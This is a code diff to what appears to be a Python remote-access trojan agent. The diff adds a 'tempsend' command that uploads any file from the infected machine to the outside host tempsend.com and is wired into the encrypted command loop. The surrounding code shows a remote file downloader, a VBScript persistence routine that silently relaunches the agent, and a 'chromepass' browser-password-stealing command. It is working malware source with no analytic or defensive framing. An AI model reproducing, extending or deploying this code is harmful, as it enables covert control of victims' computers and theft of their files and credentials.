@@ -47,11 +47,20 @@ def fconnect():
 	s.send(success)
 	s.settimeout(999)
 
-def Wget(file):
-	down = urllib2.urlopen(file)
-	filename = file.split('/')[-1]
+def Wget(dfile):
+	down = urllib2.urlopen(dfile)
+	filename = dfile.split('/')[-1]
 	with open(pwd.strip('**r') + os.sep + filename,'wb') as o:
 		o.write(down.read())
+
+def ftempsend(ufile):
+	if os.sep not in ufile:
+		ufile = pwd.strip('**r') + os.sep + ufile
+	if not os.path.isfile(ufile):
+		return ' [X] Error, no file found at %s.' % (ufile)
+	with open(ufile, 'rb') as uf:
+		r = requests.post("http://tempsend.com/send", data={'expire':'2678400'}, files={'file': uf})
+	return ' [*] ' + str(r.url)
 
 def fpersist():
 	vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
@@ -312,6 +321,9 @@ while True:
 	# 		encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFSEOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZEOFEOFEOFEOFEOFZ")
 	# 	s.send(encrypted)
 	# 	os.remove(upfile)
+
+	elif decrypted.startswith("tempsend "):
+		sendAES(ftempsend(decrypted.split(' ')[1]))
 
 	elif decrypted.startswith("chromepass"):
 		if pwdvar == 'cd':
